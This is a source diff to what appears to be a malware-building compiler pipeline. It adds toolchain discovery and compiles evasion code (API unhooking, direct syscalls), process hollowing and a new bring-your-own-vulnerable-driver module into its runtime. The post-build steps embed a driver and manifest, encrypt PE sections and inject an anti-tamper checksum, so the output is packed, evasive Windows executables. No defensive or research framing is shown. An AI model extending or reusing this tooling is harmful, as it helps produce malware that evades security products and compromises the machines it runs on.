@@ -2,6 +2,7 @@
 #include "lexer.h"
 #include "parser.h"
 #include "codegen.h"
+#include "packer.h"
 #include <cstdlib>
 #include <iostream>
 #include <fstream>
@@ -170,7 +171,19 @@ bool Pipeline::findToolchain(const CompileOptions& opts, std::string& outClang, 
                 }
             }
 #else
-            prefix = "/home/kamini/projects/llvm-obfuscation-tools-linux-x86_64";
+            // Check JOCKY_LLVM_ROOT env var first, then probe distro paths
+            const char* envRoot = std::getenv("JOCKY_LLVM_ROOT");
+            if (envRoot && std::filesystem::exists(std::string(envRoot) + "/bin/clang")) {
+                prefix = envRoot;
+            } else {
+                for (const std::string ver : {"19", "18", "17", "16", "15"}) {
+                    std::string cand = "/usr/lib/llvm-" + ver;
+                    if (std::filesystem::exists(cand + "/bin/clang")) {
+                        prefix = cand;
+                        break;
+                    }
+                }
+            }
 #endif
         }
     }
@@ -459,6 +472,7 @@ bool Pipeline::compileRuntime(const std::string& clang, const std::string& outDi
         sources.push_back(runtimeDir / "evasion" / "unhook.c");
         sources.push_back(runtimeDir / "evasion" / "syscalls.c");
         sources.push_back(runtimeDir / "execution" / "hollow.c");
+        sources.push_back(runtimeDir / "execution" / "byovd.c");
     }
 
     for (const auto& src : sources) {
@@ -554,26 +568,53 @@ bool Pipeline::run(const CompileOptions& opts) {
 
     std::cout << "[+] Build succeeded: " << exePath << "\n";
 
-    if (opts.pack) {
-        std::cout << "[*] Packing binary with UPX...\n";
-        std::string upx;
-#ifdef _WIN32
-        upx = "upx.exe";
-#else
-        upx = "/tmp/upx";
-        if (!std::filesystem::exists(upx)) {
-            upx = "upx";
+    // ── Step 1: embed driver (before anti-tamper so it is covered by the hash)
+    if (!opts.embedDriverPath.empty()) {
+        if (!isWindowsTarget) {
+            std::cerr << "[!] --embed-driver is only supported for Windows targets\n";
+        } else {
+            std::cout << "[*] Embedding driver: " << opts.embedDriverPath << "\n";
+            if (!embedDriver(exePath, opts.embedDriverPath)) {
+                std::cerr << "[!] Warning: driver embedding failed\n";
+            }
         }
-#endif
-        std::string cmd = upx + " --best " + exePath;
-#ifdef _WIN32
-        cmd += " >nul 2>&1";
-#else
-        cmd += " 2>/dev/null";
-#endif
-        if (!exec(cmd)) {
-            std::cerr << "[!] Warning: UPX not found. Binary was NOT packed.\n";
-            std::cerr << "    Install UPX or place the binary on PATH to enable packing.\n";
+    }
+
+    // ── Step 1b: embed driver interaction manifest (Windows only, before hash)
+    if (!opts.manifestPath.empty()) {
+        if (!isWindowsTarget) {
+            std::cerr << "[!] --manifest is only supported for Windows targets\n";
+        } else {
+            std::cout << "[*] Embedding driver manifest: " << opts.manifestPath << "\n";
+            if (!embedManifest(exePath, opts.manifestPath)) {
+                std::cerr << "[!] Warning: manifest embedding failed\n";
+            }
+        }
+    }
+
+    // ── Step 2: section encryption (Windows) or UPX (Linux)
+    if (opts.pack) {
+        if (isWindowsTarget) {
+            std::cout << "[*] Encrypting PE sections (.text/.rdata)...\n";
+            if (!packPE(exePath)) {
+                std::cerr << "[!] Warning: PE section encryption failed\n";
+            }
+        } else {
+            std::cout << "[*] Packing binary with UPX...\n";
+            std::string upx = "/tmp/upx";
+            if (!std::filesystem::exists(upx)) upx = "upx";
+            std::string cmd = upx + " --best " + exePath + " 2>/dev/null";
+            if (!exec(cmd)) {
+                std::cerr << "[!] Warning: UPX not found or failed; binary not packed.\n";
+            }
+        }
+    }
+
+    // ── Step 3: anti-tamper (Windows only, always last so hash covers everything)
+    if (isWindowsTarget) {
+        std::cout << "[*] Injecting anti-tamper checksum (.jtamp)...\n";
+        if (!addAntiTamper(exePath)) {
+            std::cerr << "[!] Warning: anti-tamper injection failed\n";
         }
     }
 
